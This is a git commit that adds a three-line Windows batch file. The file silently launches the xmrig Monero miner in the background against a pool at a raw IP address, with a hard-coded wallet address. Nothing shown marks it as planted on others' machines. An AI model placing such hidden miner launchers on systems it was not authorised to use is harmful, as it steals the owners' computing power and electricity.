99caaec27d08badf0d63bec70aa0747bd29388fb
Soumabha Majumdar <soumaha.majumdar@gmail.com>
2024-12-25 21:30:09 +0530

    Create rig.bat

---
+++ rig.bat
@@ -0,0 +1,3 @@
+@echo off
+start /b "" "C:\Users\ssepi\OneDrive\Desktop\xmrig.exe" -o 51.195.200.94:18081 -a rx/0 -u 47knyR9aGXsfR7FQVydRLVCNQu1SuWHtM3Mzsm8rajEaAB2r5vBnkdkTcezYRmEPQ39QGceKGVUvDQx69UM8EN6w7xU2XXn --daemon
+exit
